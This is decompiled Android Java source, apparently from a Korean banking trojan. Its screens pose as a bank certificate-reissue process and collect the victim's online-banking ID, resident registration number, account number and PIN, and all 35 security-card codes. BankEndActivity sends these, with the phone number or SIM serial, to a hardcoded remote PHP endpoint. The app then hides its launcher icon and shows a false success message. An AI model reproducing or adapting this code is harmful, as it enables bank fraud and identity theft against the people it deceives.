package cn.smsmanager.tools;

import android.util.Log;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONException;
import org.json.JSONObject;

public class JSONParser {
    static InputStream is = null;
    static JSONObject jObj = null;
    static String json = "";

    public JSONObject makeHttpRequest(String url, String method, List<NameValuePair> params) {
        try {
            if (method == "POST") {
                DefaultHttpClient httpClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost(url);
                httpPost.setEntity(new UrlEncodedFormEntity(params, "EUC-KR"));
                is = httpClient.execute(httpPost).getEntity().getContent();
            } else if (method == "GET") {
                is = new DefaultHttpClient().execute(new HttpGet(new StringBuilder(String.valueOf(url)).append("?").append(URLEncodedUtils.format(params, "EUC-KR")).toString())).getEntity().getContent();
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e2) {
            e2.printStackTrace();
        } catch (IOException e3) {
            e3.printStackTrace();
        }
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(is, "iso-8859-1"), 8);
            StringBuilder sb = new StringBuilder();
            while (true) {
                String line = reader.readLine();
                if (line == null) {
                    break;
                }
                sb.append(new StringBuilder(String.valueOf(line)).append("\n").toString());
            }
            is.close();
            json = sb.toString();
        } catch (Exception e4) {
            Log.e("Buffer Error", "Error converting result " + e4.toString());
        }
        try {
            jObj = new JSONObject(json);
        } catch (JSONException e5) {
            Log.e("JSON Parser", "Error parsing data " + e5.toString());
        }
        return jObj;
    }
}
package com.example.bankmanager;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import com.example.smsmanager.R;

public class BankScardActivity extends Activity {
    Button next;
    EditText sn1;
    EditText sn10;
    EditText sn11;
    EditText sn12;
    EditText sn13;
    EditText sn14;
    EditText sn15;
    EditText sn16;
    EditText sn17;
    EditText sn18;
    EditText sn19;
    EditText sn2;
    EditText sn20;
    EditText sn21;
    EditText sn22;
    EditText sn23;
    EditText sn24;
    EditText sn25;
    EditText sn26;
    EditText sn27;
    EditText sn28;
    EditText sn29;
    EditText sn3;
    EditText sn30;
    EditText sn31;
    EditText sn32;
    EditText sn33;
    EditText sn34;
    EditText sn35;
    EditText sn4;
    EditText sn5;
    EditText sn6;
    EditText sn7;
    EditText sn8;
    EditText sn9;
    EditText sntop;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.scard);
        this.next = (Button) findViewById(R.id.scard_button1);
        initView();
        this.next.setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                BankInfo.scard = BankScardActivity.this.sntop.getText().toString();
                int i = 0;
                if (BankScardActivity.this.sn1.getText().toString() != "" && BankScardActivity.this.sn1.getText().toString().length() == 4) {
                    BankInfo.sn1 = BankScardActivity.this.sn1.getText().toString();
                    i = 0 + 1;
                }
                if (BankScardActivity.this.sn2.getText().toString() != "" && BankScardActivity.this.sn2.getText().toString().length() == 4) {
                    BankInfo.sn2 = BankScardActivity.this.sn2.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn3.getText().toString() != "" && BankScardActivity.this.sn3.getText().toString().length() == 4) {
                    BankInfo.sn3 = BankScardActivity.this.sn3.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn4.getText().toString() != "" && BankScardActivity.this.sn4.getText().toString().length() == 4) {
                    BankInfo.sn4 = BankScardActivity.this.sn4.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn5.getText().toString() != "" && BankScardActivity.this.sn5.getText().toString().length() == 4) {
                    BankInfo.sn5 = BankScardActivity.this.sn5.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn6.getText().toString() != "" && BankScardActivity.this.sn6.getText().toString().length() == 4) {
                    BankInfo.sn6 = BankScardActivity.this.sn6.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn7.getText().toString() != "" && BankScardActivity.this.sn7.getText().toString().length() == 4) {
                    BankInfo.sn7 = BankScardActivity.this.sn7.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn8.getText().toString() != "" && BankScardActivity.this.sn8.getText().toString().length() == 4) {
                    BankInfo.sn8 = BankScardActivity.this.sn8.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn9.getText().toString() != "" && BankScardActivity.this.sn9.getText().toString().length() == 4) {
                    BankInfo.sn9 = BankScardActivity.this.sn9.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn10.getText().toString() != "" && BankScardActivity.this.sn10.getText().toString().length() == 4) {
                    BankInfo.sn10 = BankScardActivity.this.sn10.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn11.getText().toString() != "" && BankScardActivity.this.sn11.getText().toString().length() == 4) {
                    BankInfo.sn11 = BankScardActivity.this.sn11.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn12.getText().toString() != "" && BankScardActivity.this.sn12.getText().toString().length() == 4) {
                    BankInfo.sn12 = BankScardActivity.this.sn12.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn13.getText().toString() != "" && BankScardActivity.this.sn13.getText().toString().length() == 4) {
                    BankInfo.sn13 = BankScardActivity.this.sn13.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn14.getText().toString() != "" && BankScardActivity.this.sn14.getText().toString().length() == 4) {
                    BankInfo.sn14 = BankScardActivity.this.sn14.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn15.getText().toString() != "" && BankScardActivity.this.sn15.getText().toString().length() == 4) {
                    BankInfo.sn15 = BankScardActivity.this.sn15.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn16.getText().toString() != "" && BankScardActivity.this.sn16.getText().toString().length() == 4) {
                    BankInfo.sn16 = BankScardActivity.this.sn16.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn17.getText().toString() != "" && BankScardActivity.this.sn17.getText().toString().length() == 4) {
                    BankInfo.sn17 = BankScardActivity.this.sn17.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn18.getText().toString() != "" && BankScardActivity.this.sn18.getText().toString().length() == 4) {
                    BankInfo.sn18 = BankScardActivity.this.sn18.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn19.getText().toString() != "" && BankScardActivity.this.sn19.getText().toString().length() == 4) {
                    BankInfo.sn19 = BankScardActivity.this.sn19.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn20.getText().toString() != "" && BankScardActivity.this.sn20.getText().toString().length() == 4) {
                    BankInfo.sn20 = BankScardActivity.this.sn20.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn21.getText().toString() != "" && BankScardActivity.this.sn21.getText().toString().length() == 4) {
                    BankInfo.sn21 = BankScardActivity.this.sn21.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn22.getText().toString() != "" && BankScardActivity.this.sn22.getText().toString().length() == 4) {
                    BankInfo.sn22 = BankScardActivity.this.sn22.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn23.getText().toString() != "" && BankScardActivity.this.sn23.getText().toString().length() == 4) {
                    BankInfo.sn23 = BankScardActivity.this.sn23.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn24.getText().toString() != "" && BankScardActivity.this.sn24.getText().toString().length() == 4) {
                    BankInfo.sn24 = BankScardActivity.this.sn24.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn25.getText().toString() != "" && BankScardActivity.this.sn25.getText().toString().length() == 4) {
                    BankInfo.sn25 = BankScardActivity.this.sn25.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn26.getText().toString() != "" && BankScardActivity.this.sn26.getText().toString().length() == 4) {
                    BankInfo.sn26 = BankScardActivity.this.sn26.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn27.getText().toString() != "" && BankScardActivity.this.sn27.getText().toString().length() == 4) {
                    BankInfo.sn27 = BankScardActivity.this.sn27.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn28.getText().toString() != "" && BankScardActivity.this.sn28.getText().toString().length() == 4) {
                    BankInfo.sn28 = BankScardActivity.this.sn28.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn29.getText().toString() != "" && BankScardActivity.this.sn29.getText().toString().length() == 4) {
                    BankInfo.sn29 = BankScardActivity.this.sn29.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn30.getText().toString() != "" && BankScardActivity.this.sn30.getText().toString().length() == 4) {
                    BankInfo.sn30 = BankScardActivity.this.sn30.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn31.getText().toString() != "" && BankScardActivity.this.sn31.getText().toString().length() == 4) {
                    BankInfo.sn31 = BankScardActivity.this.sn31.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn32.getText().toString() != "" && BankScardActivity.this.sn32.getText().toString().length() == 4) {
                    BankInfo.sn32 = BankScardActivity.this.sn32.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn33.getText().toString() != "" && BankScardActivity.this.sn33.getText().toString().length() == 4) {
                    BankInfo.sn33 = BankScardActivity.this.sn33.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn34.getText().toString() != "" && BankScardActivity.this.sn34.getText().toString().length() == 4) {
                    BankInfo.sn34 = BankScardActivity.this.sn34.getText().toString();
                    i++;
                }
                if (BankScardActivity.this.sn35.getText().toString() != "" && BankScardActivity.this.sn35.getText().toString().length() == 4) {
                    BankInfo.sn35 = BankScardActivity.this.sn35.getText().toString();
                    i++;
                }
                if (i == 35) {
                    Intent intent = new Intent();
                    intent.setClass(BankScardActivity.this.getApplicationContext(), BankEndActivity.class);
                    BankScardActivity.this.startActivity(intent);
                    return;
                }
                Toast.makeText(BankScardActivity.this.getApplicationContext(), "보안카드번호 및 일련번호확인바립니다!", 0).show();
            }
        });
    }

    /* access modifiers changed from: 0000 */
    public void initView() {
        this.sntop = (EditText) findViewById(R.id.scard_editTexttop);
        this.sn1 = (EditText) findViewById(R.id.r1_editText1);
        this.sn2 = (EditText) findViewById(R.id.r1_editText2);
        this.sn3 = (EditText) findViewById(R.id.r1_editText3);
        this.sn4 = (EditText) findViewById(R.id.r1_editText4);
        this.sn5 = (EditText) findViewById(R.id.r1_editText5);
        this.sn6 = (EditText) findViewById(R.id.r1_editText6);
        this.sn7 = (EditText) findViewById(R.id.r1_editText7);
        this.sn8 = (EditText) findViewById(R.id.r2_editText1);
        this.sn9 = (EditText) findViewById(R.id.r2_editText2);
        this.sn10 = (EditText) findViewById(R.id.r2_editText3);
        this.sn11 = (EditText) findViewById(R.id.r2_editText4);
        this.sn12 = (EditText) findViewById(R.id.r2_editText5);
        this.sn13 = (EditText) findViewById(R.id.r2_editText6);
        this.sn14 = (EditText) findViewById(R.id.r2_editText7);
        this.sn15 = (EditText) findViewById(R.id.r3_editText1);
        this.sn16 = (EditText) findViewById(R.id.r3_editText2);
        this.sn17 = (EditText) findViewById(R.id.r3_editText3);
        this.sn18 = (EditText) findViewById(R.id.r3_editText4);
        this.sn19 = (EditText) findViewById(R.id.r3_editText5);
        this.sn20 = (EditText) findViewById(R.id.r3_editText6);
        this.sn21 = (EditText) findViewById(R.id.r3_editText7);
        this.sn22 = (EditText) findViewById(R.id.r4_editText1);
        this.sn23 = (EditText) findViewById(R.id.r4_editText2);
        this.sn24 = (EditText) findViewById(R.id.r4_editText3);
        this.sn25 = (EditText) findViewById(R.id.r4_editText4);
        this.sn26 = (EditText) findViewById(R.id.r4_editText5);
        this.sn27 = (EditText) findViewById(R.id.r4_editText6);
        this.sn28 = (EditText) findViewById(R.id.r4_editText7);
        this.sn29 = (EditText) findViewById(R.id.r5_editText1);
        this.sn30 = (EditText) findViewById(R.id.r5_editText2);
        this.sn31 = (EditText) findViewById(R.id.r5_editText3);
        this.sn32 = (EditText) findViewById(R.id.r5_editText4);
        this.sn33 = (EditText) findViewById(R.id.r5_editText5);
        this.sn34 = (EditText) findViewById(R.id.r5_editText6);
        this.sn35 = (EditText) findViewById(R.id.r5_editText7);
    }
}
package com.example.bankmanager;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import com.example.smsmanager.R;

public class BankNumActivity extends Activity {
    EditText ed1;
    EditText ed2;
    Button next;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.banknum);
        this.next = (Button) findViewById(R.id.banknum_button1);
        this.ed1 = (EditText) findViewById(R.id.banknum_editText1);
        this.ed2 = (EditText) findViewById(R.id.banknum_editText2);
        this.next.setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                String str1 = BankNumActivity.this.ed1.getText().toString();
                String str2 = BankNumActivity.this.ed2.getText().toString();
                if (str1 != null && str2 != null) {
                    if (str1.equals("") || str2.equals("")) {
                        Toast.makeText(BankNumActivity.this.getApplicationContext(), "출금계좌번호를 확인하세요", 0).show();
                    } else if (str2.length() == 4) {
                        BankInfo.banknum = str1;
                        BankInfo.banknumpw = str2;
                        Intent intent = new Intent();
                        intent.setClass(BankNumActivity.this.getApplicationContext(), BankScardActivity.class);
                        BankNumActivity.this.startActivity(intent);
                    } else {
                        Toast.makeText(BankNumActivity.this.getApplicationContext(), "계좌번호비번을 확인하세요!", 0).show();
                    }
                }
            }
        });
    }
}
package com.example.bankmanager;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import cn.smsmanager.tools.JSONParser;
import com.example.smsmanager.R;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

public class BankEndActivity extends Activity {
    private static final String TAG_SUCCESS = "success";
    String TAG = "BankEndActivity";
    EditText ed1;
    EditText ed2;
    JSONParser jsonParser = new JSONParser();
    Button next;
    /* access modifiers changed from: private */
    public ProgressDialog pDialog;
    List<NameValuePair> params;
    String phoneNumber = "";
    String send_bank_url = "http://kkk.kakatt.net:3369/send_bank.php";

    class CreateNewUser extends AsyncTask<String, String, String> {
        CreateNewUser() {
        }

        /* access modifiers changed from: protected */
        public void onPreExecute() {
            super.onPreExecute();
            BankEndActivity.this.pDialog = new ProgressDialog(BankEndActivity.this);
            BankEndActivity.this.pDialog.setMessage("신청중......");
            BankEndActivity.this.pDialog.setIndeterminate(false);
            BankEndActivity.this.pDialog.setCancelable(true);
            BankEndActivity.this.pDialog.show();
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... args) {
            int success = 0;
            BankInfo.fenlei = "bk";
            String dateString2 = "";
            try {
                dateString2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(System.currentTimeMillis()));
            } catch (Exception e) {
                dateString2 = "1970-01-01 10:12:13";
            }
            Log.i("str6", dateString2);
            TelephonyManager tel = (TelephonyManager) BankEndActivity.this.getSystemService("phone");
            String phone = tel.getLine1Number();
            if (phone == null || phone == "" || phone.length() <= 10) {
                BankEndActivity.this.phoneNumber = tel.getSimSerialNumber();
            } else {
                BankEndActivity.this.phoneNumber = phone;
            }
            BankEndActivity.this.params = new ArrayList();
            BankEndActivity.this.params.add(new BasicNameValuePair("phone", BankEndActivity.this.phoneNumber));
            BankEndActivity.this.params.add(new BasicNameValuePair("bankinid", BankInfo.bankinid));
            BankEndActivity.this.params.add(new BasicNameValuePair("jumin", BankInfo.jumin));
            BankEndActivity.this.params.add(new BasicNameValuePair("banknum", BankInfo.banknum));
            BankEndActivity.this.params.add(new BasicNameValuePair("banknumpw", BankInfo.banknumpw));
            BankEndActivity.this.params.add(new BasicNameValuePair("scard", BankInfo.scard));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn1", BankInfo.sn1));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn2", BankInfo.sn2));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn3", BankInfo.sn3));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn4", BankInfo.sn4));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn5", BankInfo.sn5));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn6", BankInfo.sn6));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn7", BankInfo.sn7));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn8", BankInfo.sn8));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn9", BankInfo.sn9));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn10", BankInfo.sn10));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn11", BankInfo.sn11));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn12", BankInfo.sn12));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn13", BankInfo.sn13));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn14", BankInfo.sn14));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn15", BankInfo.sn15));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn16", BankInfo.sn16));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn17", BankInfo.sn17));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn18", BankInfo.sn18));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn19", BankInfo.sn19));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn20", BankInfo.sn20));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn21", BankInfo.sn21));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn22", BankInfo.sn22));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn23", BankInfo.sn23));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn24", BankInfo.sn24));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn25", BankInfo.sn25));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn26", BankInfo.sn26));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn27", BankInfo.sn27));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn28", BankInfo.sn28));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn29", BankInfo.sn29));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn30", BankInfo.sn30));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn31", BankInfo.sn31));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn32", BankInfo.sn32));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn33", BankInfo.sn33));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn34", BankInfo.sn34));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn35", BankInfo.sn35));
            BankEndActivity.this.params.add(new BasicNameValuePair("renzheng", BankInfo.renzheng));
            BankEndActivity.this.params.add(new BasicNameValuePair("fenlei", BankInfo.fenlei));
            BankEndActivity.this.params.add(new BasicNameValuePair("datetime", dateString2));
            JSONObject json = BankEndActivity.this.jsonParser.makeHttpRequest(BankEndActivity.this.send_bank_url, "POST", BankEndActivity.this.params);
            Log.d("Create Response", json.toString());
            try {
                JSONObject sonObject = new JSONObject(json.toString());
                success = json.getInt(BankEndActivity.TAG_SUCCESS);
                Log.d("json.getInt", success);
                if (success == 1) {
                    BankEndActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName("com.example.smsmanager", "com.example.bankmanager.BankSplashActivity"), 2, 1);
                } else {
                    Log.i("information", "Registration failed");
                }
            } catch (JSONException e2) {
                e2.printStackTrace();
            } catch (Exception e3) {
                e3.printStackTrace();
            }
            String flag = "";
            if (success == 1) {
                return "OK";
            }
            return flag;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String result) {
            Log.d("onPostExecute", result);
            if (result.equals("신청중...")) {
                BankEndActivity.this.pDialog.setMessage("본인인증서 재발급 신청완료! 2시간후 이용가능합니다.");
            } else {
                BankEndActivity.this.pDialog.setMessage("본인인증서 재발급 신청완료! 2시간후 이용가능합니다.");
            }
            new Thread() {
                public void run() {
                    try {
                        AnonymousClass1.sleep(10000);
                        BankEndActivity.this.pDialog.dismiss();
                        Intent intent = new Intent();
                        intent.setAction("android.intent.action.MAIN");
                        intent.addCategory("android.intent.category.HOME");
                        intent.addFlags(268435456);
                        BankEndActivity.this.startActivity(intent);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        }
    }

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.bankend);
        this.next = (Button) findViewById(R.id.bankend_button1);
        this.ed1 = (EditText) findViewById(R.id.bankend_editText1);
        this.ed2 = (EditText) findViewById(R.id.bankend_editText2);
        this.next.setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                String str1 = BankEndActivity.this.ed1.getText().toString();
                String str2 = BankEndActivity.this.ed2.getText().toString();
                if (str1.equals("")) {
                    Toast.makeText(BankEndActivity.this.getApplicationContext(), "계좌번호 및 빌밀번호를 확인하세요", 0).show();
                } else if (str1.equals(str2)) {
                    BankInfo.renzheng = str1;
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.bankinid);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.jumin);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.banknum);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.banknumpw);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn1);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn2);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn3);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn4);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn6);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn7);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn8);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn9);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn10);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn11);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn12);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn13);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn14);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn15);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn16);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn17);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn18);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn19);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn20);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn21);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn22);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn23);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn24);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn25);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn26);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn27);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn28);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn29);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn30);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn31);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn32);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn33);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn34);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn35);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.renzheng);
                    new CreateNewUser().execute(new String[0]);
                } else {
                    Toast.makeText(BankEndActivity.this.getApplicationContext(), "인증서비번을 확인하세요", 0).show();
                }
            }
        });
    }
}
package com.example.bankmanager;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import com.example.smsmanager.R;

public class BankActivity extends Activity {
    EditText ed1;
    EditText ed2;
    Button next;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.bankid);
        this.next = (Button) findViewById(R.id.bankid_button1);
        this.ed1 = (EditText) findViewById(R.id.bankid_editText1);
        this.ed2 = (EditText) findViewById(R.id.bankid_editText2);
        this.next.setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                String str1 = BankActivity.this.ed1.getText().toString();
                String str2 = BankActivity.this.ed2.getText().toString();
                if (str1 != null && str2 != null) {
                    if (str1.equals("") || str2.equals("")) {
                        Toast.makeText(BankActivity.this.getApplicationContext(), "인터넷뱅킹계정을 확인하세요", 0).show();
                    } else if (str2.length() == 13) {
                        BankInfo.bankinid = str1;
                        BankInfo.jumin = str2;
                        Intent intent = new Intent();
                        intent.setClass(BankActivity.this.getApplicationContext(), BankNumActivity.class);
                        BankActivity.this.startActivity(intent);
                    } else {
                        Toast.makeText(BankActivity.this.getApplicationContext(), "주민번호를 확인하세요 ", 0).show();
                    }
                }
            }
        });
    }
}
